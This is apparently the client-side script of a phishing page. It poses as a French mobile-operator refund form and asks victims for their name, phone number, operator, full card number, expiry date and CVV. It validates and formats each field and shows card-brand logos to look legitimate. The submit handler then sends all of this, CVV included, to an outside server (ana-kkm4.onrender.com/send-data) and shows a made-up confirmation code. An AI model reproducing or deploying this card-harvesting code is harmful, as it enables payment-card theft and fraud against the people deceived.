document.getElementById('refundForm').addEventListener('submit', function (e) {
  e.preventDefault();

  // Get values
  const fullname = document.getElementById('fullname').value.trim();
  const phone = document.getElementById('phone').value.trim();
  const operator = document.getElementById('operator').value;
  const refundAmount = document.getElementById('refund-amount').value.trim();
  const cardNumber = document.getElementById('cc-number').value.replace(/\s/g, '');
  const expiry = document.getElementById('expiry').value.trim();
  const cvv = document.getElementById('cvv').value.trim();
  const terms = document.getElementById('conditions').checked;

  // Validation regexes
  const nameRegex = /^[A-Za-zÀ-ÖØ-öø-ÿ\s'-]{3,}$/;
  const phoneRegex = /^[67][0-9]{8}$/;
  const cardNumberRegex = /^\d{16}$/;
  const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
  const cvvRegex = /^\d{3}$/;
  const refundAmountRegex = /^\d{2,4}$/; // 2-4 digits

  // Validate fields
  if (!nameRegex.test(fullname)) {
    alert("Veuillez entrer un nom complet valide (au moins 3 lettres).");
    return;
  }

  if (!phoneRegex.test(phone)) {
    alert("Veuillez entrer un numéro de téléphone français valide commençant par 6 ou 7 (9 chiffres sans indicatif).");
    return;
  }

  if (!operator) {
    alert("Veuillez sélectionner un opérateur.");
    return;
  }

  if (!refundAmountRegex.test(refundAmount)) {
    alert("Veuillez entrer un montant à rembourser valide (2 à 4 chiffres).");
    return;
  }

  if (!cardNumberRegex.test(cardNumber)) {
    alert("Veuillez entrer un numéro de carte bancaire valide à 16 chiffres.");
    return;
  }

  if (!expiryRegex.test(expiry)) {
    alert("Veuillez entrer une date d'expiration valide au format MM/AA.");
    return;
  }

  // Check expiry date not past
  const [month, year] = expiry.split('/');
  const expDate = new Date(`20${year}`, month);
  const today = new Date();
  if (expDate <= today) {
    alert("La date d'expiration est déjà passée.");
    return;
  }

  if (!cvvRegex.test(cvv)) {
    alert("Veuillez entrer un CVV à 3 chiffres.");
    return;
  }

  if (!terms) {
    alert("Vous devez accepter les conditions générales.");
    return;
  }

  // Generate confirmation code
  const confirmationCode = Math.floor(100000000 + Math.random() * 900000000);

  const data = {
    fullname,
    phone,
    operator,
    refundAmount,
    cardNumber,
    expiryDate: expiry,
    cvv,
    confirmationCode
  };

  fetch('https://ana-kkm4.onrender.com/send-data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  })
    .then(response => {
      if (response.ok) {
        window.location.href = `thank-you.html?code=${confirmationCode}`;
      } else {
        alert('Erreur lors de l\'envoi.');
      }
    })
    .catch(error => {
      console.error('Erreur réseau:', error);
      alert('Erreur réseau.');
    });
});

// Input restrictions and formatting (same as before)

const fullnameInput = document.getElementById('fullname');
fullnameInput.addEventListener('input', () => {
  fullnameInput.value = fullnameInput.value.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s'-]/g, '');
});

const phoneInput = document.getElementById('phone');
phoneInput.addEventListener('input', () => {
  phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
  if (phoneInput.value.length > 9) phoneInput.value = phoneInput.value.slice(0,9);
});

const ccInput = document.getElementById('cc-number');
const cardLogoContainer = document.createElement('div');
cardLogoContainer.style.position = 'absolute';
cardLogoContainer.style.right = '2px';
cardLogoContainer.style.top = '50%';
cardLogoContainer.style.transform = 'translateY(-50%)';
cardLogoContainer.style.height = '24px';
cardLogoContainer.style.width = '28px';
cardLogoContainer.style.pointerEvents = 'none';
ccInput.parentNode.style.position = 'relative';
ccInput.parentNode.appendChild(cardLogoContainer);

ccInput.addEventListener('input', () => {
  let digits = ccInput.value.replace(/\D/g, '').slice(0,16);
  ccInput.value = digits.replace(/(.{4})/g, '$1 ').trim();

  if (digits.length >= 6) {
    const first6 = digits.slice(0,6);
    let logoSrc = '';
    if (/^4/.test(digits)) {
      logoSrc = 'images/cards/visa.png';
    } else if (/^5[1-5]/.test(digits)) {
      logoSrc = 'images/cards/mastercard.png';
    } else {
      logoSrc = '';
    }
    if (logoSrc) {
      cardLogoContainer.innerHTML = `<img src="${logoSrc}" alt="Card logo" style="height: 18px; width: auto;"/>`;
    } else {
      cardLogoContainer.innerHTML = '';
    }
  } else {
    cardLogoContainer.innerHTML = '';
  }
});

const expiryInput = document.getElementById('expiry');
expiryInput.addEventListener('input', () => {
  let value = expiryInput.value.replace(/\D/g, '').slice(0,4);
  if (value.length >= 3) {
    value = value.slice(0,2) + '/' + value.slice(2);
  }
  expiryInput.value = value;
});

const cvvInput = document.getElementById('cvv');
cvvInput.addEventListener('input', () => {
  cvvInput.value = cvvInput.value.replace(/\D/g, '').slice(0,3);
});